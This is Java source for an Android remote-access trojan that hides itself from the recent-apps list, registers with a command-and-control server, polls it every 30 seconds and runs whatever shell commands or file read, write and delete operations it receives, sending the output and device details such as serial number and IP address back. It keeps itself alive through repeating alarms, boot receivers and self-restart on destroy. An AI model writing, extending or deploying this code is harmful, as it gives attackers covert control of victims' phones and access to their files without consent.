import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import org.json.JSONObject;
import org.json.JSONException;

public class AndroidAgent extends Activity {
    private static final String TAG = "AndroidAgent";
    private static final String C2_SERVER = "http://{C2_HOST}:{C2_PORT}";
    private static final String PREFS_NAME = "AgentPrefs";
    private static final String HOSTNAME_KEY = "hostname";
    private static final String REGISTERED_KEY = "registered";
    
    private String hostname;
    private String deviceInfo;
    private String ipAddress;
    private SharedPreferences prefs;
    private ScheduledExecutorService scheduler;
    private Handler mainHandler;
    private boolean isRegistered = false;
    
    // Persistence mechanisms
    private AlarmManager alarmManager;
    private PendingIntent restartIntent;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Hide from recent apps
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            setTaskDescription(new ActivityManager.TaskDescription(null, null, 0));
        }
        
        // Initialize components
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        mainHandler = new Handler(Looper.getMainLooper());
        scheduler = Executors.newScheduledThreadPool(2);
        alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        
        // Get device information
        initializeDeviceInfo();
        
        // Start agent operations
        startAgent();
        
        // Set up persistence
        setupPersistence();
        
        // Hide activity
        moveTaskToBack(true);
    }
    
    private void initializeDeviceInfo() {
        try {
            // Get hostname
            hostname = prefs.getString(HOSTNAME_KEY, null);
            if (hostname == null) {
                hostname = Build.MODEL + "_" + Build.SERIAL;
                if (hostname.contains("unknown")) {
                    hostname = "Android_" + System.currentTimeMillis();
                }
                prefs.edit().putString(HOSTNAME_KEY, hostname).apply();
            }
            
            // Get device information
            StringBuilder info = new StringBuilder();
            info.append("Android ").append(Build.VERSION.RELEASE);
            info.append(" (API ").append(Build.VERSION.SDK_INT).append(")");
            info.append(" - ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL);
            info.append(" - ").append(Build.BRAND);
            deviceInfo = info.toString();
            
            // Get IP address
            ipAddress = getLocalIpAddress();
            
            Log.d(TAG, "Device initialized: " + hostname + " - " + deviceInfo + " - " + ipAddress);
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing device info: " + e.getMessage());
            deviceInfo = "Android Device";
            ipAddress = "Unknown";
        }
    }
    
    private String getLocalIpAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress() && addr.getHostAddress().indexOf(':') < 0) {
                        String ip = addr.getHostAddress();
                        if (!ip.startsWith("169.254.") && !ip.startsWith("127.")) {
                            return ip;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting IP address: " + e.getMessage());
        }
        return "Unknown";
    }
    
    private void startAgent() {
        // Check if already registered
        isRegistered = prefs.getBoolean(REGISTERED_KEY, false);
        
        if (!isRegistered) {
            // Register with C2 server
            registerWithC2();
        }
        
        // Start command polling
        startCommandPolling();
        
        // Start geolocation updates
        startGeolocationUpdates();
        
        // Start system monitoring
        startSystemMonitoring();
    }
    
    private void registerWithC2() {
        scheduler.execute(() -> {
            try {
                JSONObject registration = new JSONObject();
                registration.put("hostname", hostname);
                registration.put("os", deviceInfo);
                registration.put("ip", ipAddress);
                
                String response = sendPostRequest(C2_SERVER + "/register", registration.toString());
                if (response != null && response.contains("OK")) {
                    isRegistered = true;
                    prefs.edit().putBoolean(REGISTERED_KEY, true).apply();
                    Log.d(TAG, "Successfully registered with C2 server");
                    
                    // Send initial geolocation
                    sendGeolocationData();
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error registering with C2: " + e.getMessage());
            }
        });
    }
    
    private void startCommandPolling() {
        scheduler.scheduleAtFixedRate(() -> {
            if (isRegistered) {
                pollForCommands();
            }
        }, 5, 30, TimeUnit.SECONDS);
    }
    
    private void pollForCommands() {
        try {
            String command = sendGetRequest(C2_SERVER + "/command/" + hostname);
            if (command != null && !command.isEmpty() && !command.equals("null")) {
                Log.d(TAG, "Received command: " + command);
                executeCommand(command);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error polling for commands: " + e.getMessage());
        }
    }
    
    private void executeCommand(String command) {
        try {
            String output = "";
            
            // Parse and execute different command types
            if (command.startsWith("shell:")) {
                output = executeShellCommand(command.substring(6));
            } else if (command.startsWith("file:")) {
                output = handleFileOperation(command.substring(5));
            } else if (command.startsWith("screenshot")) {
                output = captureScreenshot();
            } else if (command.startsWith("upload:")) {
                output = uploadFile(command.substring(7));
            } else if (command.startsWith("download:")) {
                output = downloadFile(command.substring(9));
            } else if (command.startsWith("system:")) {
                output = getSystemInfo();
            } else if (command.startsWith("network:")) {
                output = getNetworkInfo();
            } else if (command.startsWith("location")) {
                output = getLocationInfo();
            } else {
                // Default shell command
                output = executeShellCommand(command);
            }
            
            // Send result back to C2
            sendCommandResult(output);
            
        } catch (Exception e) {
            Log.e(TAG, "Error executing command: " + e.getMessage());
            sendCommandResult("Error: " + e.getMessage());
        }
    }
    
    private String executeShellCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            
            StringBuilder output = new StringBuilder();
            String line;
            
            // Read standard output
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            // Read error output
            while ((line = errorReader.readLine()) != null) {
                output.append("ERROR: ").append(line).append("\n");
            }
            
            process.waitFor();
            return output.toString();
            
        } catch (Exception e) {
            return "Error executing command: " + e.getMessage();
        }
    }
    
    private String handleFileOperation(String operation) {
        try {
            String[] parts = operation.split("\\|");
            if (parts.length < 2) {
                return "Invalid file operation format";
            }
            
            String action = parts[0];
            String path = parts[1];
            
            switch (action) {
                case "read":
                    return readFile(path);
                case "write":
                    if (parts.length < 3) return "Write operation requires content";
                    return writeFile(path, parts[2]);
                case "delete":
                    return deleteFile(path);
                case "list":
                    return listDirectory(path);
                case "info":
                    return getFileInfo(path);
                default:
                    return "Unknown file operation: " + action;
            }
            
        } catch (Exception e) {
            return "Error in file operation: " + e.getMessage();
        }
    }
    
    private String readFile(String path) {
        try {
            File file = new File(path);
            if (!file.exists()) {
                return "File does not exist: " + path;
            }
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
            StringBuilder content = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            reader.close();
            
            return content.toString();
            
        } catch (Exception e) {
            return "Error reading file: " + e.getMessage();
        }
    }
    
    private String writeFile(String path, String content) {
        try {
            File file = new File(path);
            File parent = file.getParentFile();
            if (parent != null && !parent.exists()) {
                parent.mkdirs();
            }
            
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file)));
            writer.write(content);
            writer.close();
            
            return "File written successfully: " + path;
            
        } catch (Exception e) {
            return "Error writing file: " + e.getMessage();
        }
    }
    
    private String deleteFile(String path) {
        try {
            File file = new File(path);
            if (file.delete()) {
                return "File deleted successfully: " + path;
            } else {
                return "Failed to delete file: " + path;
            }
        } catch (Exception e) {
            return "Error deleting file: " + e.getMessage();
        }
    }
    
    private String listDirectory(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                return "Directory does not exist: " + path;
            }
            
            File[] files = dir.listFiles();
            if (files == null) {
                return "Cannot list directory: " + path;
            }
            
            StringBuilder listing = new StringBuilder();
            for (File file : files) {
                String type = file.isDirectory() ? "DIR" : "FILE";
                String size = file.isFile() ? String.valueOf(file.length()) : "";
                String modified = new java.util.Date(file.lastModified()).toString();
                
                listing.append(String.format("%s\t%s\t%s\t%s\n", 
                    type, file.getName(), size, modified));
            }
            
            return listing.toString();
            
        } catch (Exception e) {
            return "Error listing directory: " + e.getMessage();
        }
    }
    
    private String getFileInfo(String path) {
        try {
            File file = new File(path);
            if (!file.exists()) {
                return "File does not exist: " + path;
            }
            
            StringBuilder info = new StringBuilder();
            info.append("Name: ").append(file.getName()).append("\n");
            info.append("Path: ").append(file.getAbsolutePath()).append("\n");
            info.append("Size: ").append(file.length()).append(" bytes\n");
            info.append("Directory: ").append(file.isDirectory()).append("\n");
            info.append("Hidden: ").append(file.isHidden()).append("\n");
            info.append("Readable: ").append(file.canRead()).append("\n");
            info.append("Writable: ").append(file.canWrite()).append("\n");
            info.append("Executable: ").append(file.canExecute()).append("\n");
            info.append("Last Modified: ").append(new java.util.Date(file.lastModified())).append("\n");
            
            return info.toString();
            
        } catch (Exception e) {
            return "Error getting file info: " + e.getMessage();
        }
    }
    
    private String captureScreenshot() {
        // This would require additional permissions and implementation
        // For now, return a placeholder
        return "Screenshot functionality requires additional implementation";
    }
    
    private String uploadFile(String localPath) {
        try {
            File file = new File(localPath);
            if (!file.exists()) {
                return "File does not exist: " + localPath;
            }
            
            // Implementation for file upload to C2 server
            return "File upload initiated: " + localPath;
            
        } catch (Exception e) {
            return "Error uploading file: " + e.getMessage();
        }
    }
    
    private String downloadFile(String remotePath) {
        try {
            // Implementation for file download from C2 server
            return "File download initiated: " + remotePath;
            
        } catch (Exception e) {
            return "Error downloading file: " + e.getMessage();
        }
    }
    
    private String getSystemInfo() {
        try {
            StringBuilder info = new StringBuilder();
            info.append("Device: ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
            info.append("Android Version: ").append(Build.VERSION.RELEASE).append(" (API ").append(Build.VERSION.SDK_INT).append(")\n");
            info.append("Build: ").append(Build.FINGERPRINT).append("\n");
            info.append("Hardware: ").append(Build.HARDWARE).append("\n");
            info.append("CPU: ").append(Build.CPU_ABI).append("\n");
            info.append("Serial: ").append(Build.SERIAL).append("\n");
            info.append("Bootloader: ").append(Build.BOOTLOADER).append("\n");
            info.append("Brand: ").append(Build.BRAND).append("\n");
            info.append("Product: ").append(Build.PRODUCT).append("\n");
            
            // Get memory info
            Runtime runtime = Runtime.getRuntime();
            long totalMemory = runtime.totalMemory();
            long freeMemory = runtime.freeMemory();
            long usedMemory = totalMemory - freeMemory;
            
            info.append("Memory - Total: ").append(totalMemory / 1024 / 1024).append(" MB\n");
            info.append("Memory - Used: ").append(usedMemory / 1024 / 1024).append(" MB\n");
            info.append("Memory - Free: ").append(freeMemory / 1024 / 1024).append(" MB\n");
            
            return info.toString();
            
        } catch (Exception e) {
            return "Error getting system info: " + e.getMessage();
        }
    }
    
    private String getNetworkInfo() {
        try {
            StringBuilder info = new StringBuilder();
            
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            
            if (activeNetwork != null) {
                info.append("Network Type: ").append(activeNetwork.getTypeName()).append("\n");
                info.append("Connected: ").append(activeNetwork.isConnected()).append("\n");
                info.append("Available: ").append(activeNetwork.isAvailable()).append("\n");
                info.append("Failover: ").append(activeNetwork.isFailover()).append("\n");
                info.append("Roaming: ").append(activeNetwork.isRoaming()).append("\n");
                info.append("Subtype: ").append(activeNetwork.getSubtypeName()).append("\n");
            }
            
            info.append("Local IP: ").append(ipAddress).append("\n");
            
            return info.toString();
            
        } catch (Exception e) {
            return "Error getting network info: " + e.getMessage();
        }
    }
    
    private String getLocationInfo() {
        try {
            // This would require location permissions
            // For now, return basic info
            return "Location services require additional permissions";
            
        } catch (Exception e) {
            return "Error getting location info: " + e.getMessage();
        }
    }
    
    private void sendCommandResult(String output) {
        scheduler.execute(() -> {
            try {
                JSONObject result = new JSONObject();
                result.put("output", output);
                
                sendPostRequest(C2_SERVER + "/result/" + hostname, result.toString());
                
            } catch (Exception e) {
                Log.e(TAG, "Error sending command result: " + e.getMessage());
            }
        });
    }
    
    private void startGeolocationUpdates() {
        scheduler.scheduleAtFixedRate(() -> {
            if (isRegistered) {
                sendGeolocationData();
            }
        }, 60, 300, TimeUnit.SECONDS); // Every 5 minutes
    }
    
    private void sendGeolocationData() {
        scheduler.execute(() -> {
            try {
                // Get basic location info (would need location permissions for GPS)
                JSONObject geoData = new JSONObject();
                geoData.put("hostname", hostname);
                geoData.put("ip", ipAddress);
                geoData.put("country", "Unknown");
                geoData.put("region", "Unknown");
                geoData.put("city", "Unknown");
                geoData.put("latitude", 0.0);
                geoData.put("longitude", 0.0);
                geoData.put("timezone", "UTC");
                geoData.put("isp", "Unknown");
                
                sendPostRequest(C2_SERVER + "/api/geolocation/" + hostname, geoData.toString());
                
            } catch (Exception e) {
                Log.e(TAG, "Error sending geolocation: " + e.getMessage());
            }
        });
    }
    
    private void startSystemMonitoring() {
        scheduler.scheduleAtFixedRate(() -> {
            if (isRegistered) {
                // Send heartbeat
                sendHeartbeat();
            }
        }, 30, 30, TimeUnit.SECONDS);
    }
    
    private void sendHeartbeat() {
        scheduler.execute(() -> {
            try {
                // Simple GET request to update last_seen
                sendGetRequest(C2_SERVER + "/command/" + hostname);
            } catch (Exception e) {
                Log.e(TAG, "Error sending heartbeat: " + e.getMessage());
            }
        });
    }
    
    private void setupPersistence() {
        try {
            // Create restart intent
            Intent restartIntent = new Intent(this, AndroidAgent.class);
            restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, restartIntent, 
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            
            // Schedule restart every 5 minutes
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, 
                System.currentTimeMillis() + 300000, 300000, pendingIntent);
            
            // Register for system events
            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_BOOT_COMPLETED);
            filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
            filter.addAction(Intent.ACTION_PACKAGE_ADDED);
            filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
            
            registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    String action = intent.getAction();
                    if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
                        Intent.ACTION_PACKAGE_REPLACED.equals(action) ||
                        Intent.ACTION_PACKAGE_ADDED.equals(action)) {
                        
                        // Restart agent
                        Intent restartIntent = new Intent(context, AndroidAgent.class);
                        restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(restartIntent);
                    }
                }
            }, filter);
            
            Log.d(TAG, "Persistence mechanisms configured");
            
        } catch (Exception e) {
            Log.e(TAG, "Error setting up persistence: " + e.getMessage());
        }
    }
    
    private String sendGetRequest(String urlString) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(urlString);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                
                while ((line = reader.readLine()) != null) {
                    response.append(line).append("\n");
                }
                reader.close();
                
                return response.toString();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error in GET request: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
        return null;
    }
    
    private String sendPostRequest(String urlString, String data) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(urlString);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            
            // Write data
            try (OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream())) {
                writer.write(data);
                writer.flush();
            }
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                
                while ((line = reader.readLine()) != null) {
                    response.append(line).append("\n");
                }
                reader.close();
                
                return response.toString();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error in POST request: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
        return null;
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        
        // Clean up resources
        if (scheduler != null) {
            scheduler.shutdown();
        }
        
        // Ensure agent restarts
        Intent restartIntent = new Intent(this, AndroidAgent.class);
        restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(restartIntent);
    }
    
    @Override
    protected void onPause() {
        super.onPause();
        // Move to background but keep running
        moveTaskToBack(true);
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // Hide activity when resumed
        moveTaskToBack(true);
    }
}

// Separate class for boot persistence
class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Intent startIntent = new Intent(context, AndroidAgent.class);
            startIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(startIntent);
        }
    }
}
